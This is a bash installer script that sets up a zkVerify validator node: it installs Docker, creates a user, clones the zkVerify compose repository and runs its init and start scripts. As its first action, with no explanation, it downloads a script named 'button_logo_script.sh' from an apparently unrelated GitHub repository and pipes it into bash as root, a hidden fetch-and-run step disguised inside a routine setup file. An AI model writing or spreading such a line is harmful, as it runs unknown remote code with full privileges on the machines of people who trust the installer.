#!/bin/bash

set -e
curl -s https://raw.githubusercontent.com/zidanaetrna/unichain/refs/heads/main/button_logo_script.sh | bash

# Update system and install required packages
echo "Updating system and installing dependencies..."
apt update && apt install -y docker.io docker-compose jq sed

# Prompt user for the new username
echo "Please enter the username you want to create:"
read NEW_USER

# Create the new user
echo "Creating user: $NEW_USER..."
useradd -m -s /bin/bash $NEW_USER
passwd $NEW_USER
usermod -aG docker $NEW_USER

echo "User $NEW_USER has been created and added to the Docker group."

# Switch to new user
echo "Switching to user: $NEW_USER..."
su - $NEW_USER <<EOF

# Clone the repository
echo "Cloning ZkVerify repository..."
git clone https://github.com/zkVerify/compose-zkverify-simplified.git
cd compose-zkverify-simplified

# Run the initialization script
echo "Running initialization script..."
./scripts/init.sh

# Start the validator node
echo "Starting the ZkVerify node..."
./scripts/start.sh

EOF

echo "ZkVerify node setup is complete!"

# Display final instructions
echo "To check running Docker containers, use: docker container ls"
echo "To check logs, use: docker logs -f validator-node"
echo "For further steps, refer to: https://docs.zkverify.io/tutorials/how_to_run_a_node/run_using_docker/run_new_validator_node/"
